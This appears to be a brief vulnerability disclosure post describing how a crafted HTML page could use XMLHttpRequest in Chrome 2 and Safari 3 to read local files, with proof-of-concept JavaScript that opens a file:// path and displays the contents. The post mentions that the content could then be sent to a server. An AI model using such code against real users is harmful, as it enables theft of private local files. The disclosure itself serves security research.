Subject: XMLHttpRequest file upload vulnerability Chrome 2 & Safari 3


.html can be crafted to force a unaware user to read file from local, and then possibly send it to a server.

var method = "GET"
var URL = "file:///C:/argentina/bsas_junin.txt"
xmlhttp.open( method, URL, true)

This type of request is possible if file is on user local  in the user hard disk (CHROME2), in other browser I was able to do the same but with a LAN access to file, no need to write in local hard disk (SAFARI3)


if (xmlhttp != null) {
	xmlhttp.open( method, URL, true)
	xmlhttp.onreadystatechange=function(){
	if (xmlhttp.readyState==4) {
           alert(URL + "\n\n" + xmlhttp.responseText)
		}
		}	 
	}

this is a valid operation javascript can read then xmlhttp.responseText, yes the file content.

After this you can do whatever you want whit the file.

note that you MUST know the file path!!
